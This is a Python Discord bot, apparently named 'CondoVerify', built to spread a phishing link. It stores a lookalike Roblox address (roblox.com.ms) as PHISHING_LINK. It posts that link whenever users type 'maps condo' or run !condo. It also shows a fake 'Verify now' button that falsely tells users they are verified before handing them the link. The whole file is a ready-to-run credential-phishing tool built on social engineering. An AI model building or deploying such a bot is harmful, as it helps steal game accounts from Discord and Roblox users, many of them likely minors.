import discord
from discord.ext import commands
import os

# ===== KONFIGURASI =====
TOKEN = os.getenv("TOKEN") or "masukkan_token_bot_kamu_disini"
GUILD_ID = int(os.getenv("GUILD_ID") or 123456789012345678)
PHISHING_LINK = "https://roblox.com.ms/games/88585434928512/EVOLUTION-Bubble-Battles-2?privateServerLinkCode=57651988341199565220149480502764"
HELP_TEXT = "DM me if you need help: @yourusername"

# ===== SETUP BOT =====
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"✅ CondoVerify online: {bot.user}")
    print(f"🎯 Server ID: {GUILD_ID}")
    print(f"🔗 Phishing link: {PHISHING_LINK}")


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # Keyword "maps condo" → kirim link phishing
    if "maps condo" in message.content.lower():
        await message.channel.send(f"🔗 **Maps Condo**\n{PHISHING_LINK}")

    # Keyword "help" → kirim bantuan
    if message.content.lower() in ["help", "!help"]:
        embed = discord.Embed(
            title="🆘 Help",
            description=f"Need help? Contact me directly:\n{HELP_TEXT}",
            color=0x4a6aff
        )
        await message.channel.send(embed=embed)

    await bot.process_commands(message)


@bot.command(name="verify")
async def verify(ctx):
    """🔐 Verify for access to the other channels"""
    embed = discord.Embed(
        title="🔐 Verify for access to the other channels",
        description="Click the button below to verify.",
        color=0x4a6aff
    )
    embed.set_footer(text="CondoVerify • 8/30/26")

    view = discord.ui.View()
    verify_btn = discord.ui.Button(
        label="Verify now",
        style=discord.ButtonStyle.primary,
        custom_id="verify_btn"
    )
    view.add_item(verify_btn)

    await ctx.send(embed=embed, view=view)


@bot.command(name="condo")
async def condo(ctx):
    """🏠 Maps Condo link"""
    await ctx.send(f"🔗 **Maps Condo**\n{PHISHING_LINK}")


@bot.event
async def on_interaction(interaction):
    if interaction.type == discord.InteractionType.component:
        if interaction.data.get("custom_id") == "verify_btn":
            await interaction.response.send_message(
                f"✅ Verified! You now have access.\n\n🔗 **Maps Condo**\n{PHISHING_LINK}",
                ephemeral=True
            )


if __name__ == "__main__":
    bot.run(TOKEN)
